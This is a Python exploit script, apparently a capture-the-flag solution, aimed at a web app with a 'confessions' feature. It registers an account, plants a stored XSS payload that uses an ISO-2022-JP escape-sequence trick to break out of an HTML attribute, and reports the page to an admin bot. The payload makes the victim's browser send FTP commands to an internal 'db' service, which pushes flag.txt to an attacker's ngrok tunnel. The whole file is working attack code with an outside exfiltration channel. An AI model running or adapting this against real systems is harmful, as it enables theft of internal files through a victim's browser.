# /// script
# requires-python = ">=3.13"
# dependencies = [
#     "requests",
# ]
# ///
import requests
import socket
import random
import re

# Change this
BASE_URL = "http://192.168.0.125:3000"
ADMIN_URL = "http://192.168.0.125:1337/api/report"
ngrok = "0.tcp.ap.ngrok.io:12961"

ngrok_ip, ngrok_port = ngrok.split(":")
ip = socket.gethostbyname(ngrok_ip)
port = int(ngrok_port)

session = requests.Session()

# proxies = {
#     "http":"http://127.0.0.1:8080",
#     "https":"https://127.0.0.1:8080"
# }


# Register and login
username = "user" + str(random.randint(1,6767)).zfill(5)
password = "n,y~yvjiv,xl>mE$"
user = {
    "username": username,
    "password": password
}

print("[+] Registering user.")
r = session.post(f"{BASE_URL}/register", data=user)
if r.status_code == 200:
    print("[+] User registered.")
    print(f"[+] USERNAME: {username}")
    print(f"[+] PASSWORD: {password}")
else:
    print("[-] Failed to register")
    exit(1)

print("[+] Logging in")
r = session.post(f"{BASE_URL}/login", data=user)
if r.status_code == 200:
    print("[+] Login success.")
else:
    print("[-] Failed to login")
    exit(1)

payload = {
    "content": f"""<a id="\x1b$B"></a>\x1b(B<a id="><img src=x onerror='fetch(`//db:2121`, {{ method: `POST`, mode: `no-cors`, body: `USER anonymous\\r\\nPASS anonymous\\r\\nPORT {ip.replace(".", ",")},{port // 256},{port % 256}\\r\\nRETR flag.txt\\r\\n\\r\\n` }}).then(r => r.text())'>"></a>
    """
}

r = session.post(f"{BASE_URL}/save", data=payload)
if r.status_code == 200:
    print("[+] Post created.")
else:
    print("[-] Failed to create post")
    exit(1)

r = session.get(f"{BASE_URL}/confessions")
if r.status_code == 200:
    html = r.text
    match = re.search(r'href="(/confession/[a-f0-9\-]+)"', html)
    if match:
        link = match.group(1) 
        payload_link = BASE_URL + link
        print(f"Post created at: {payload_link}")
    else:
        print("Post not found")
else:
    print("[-] Failed to fetch post")
    exit(1)

report = {
    "url": payload_link
}

print("[+] Submit post to admin")
submit = requests.post(ADMIN_URL, data=report)
if submit.status_code != 200:
    print("[-] Failed to submit to admin")
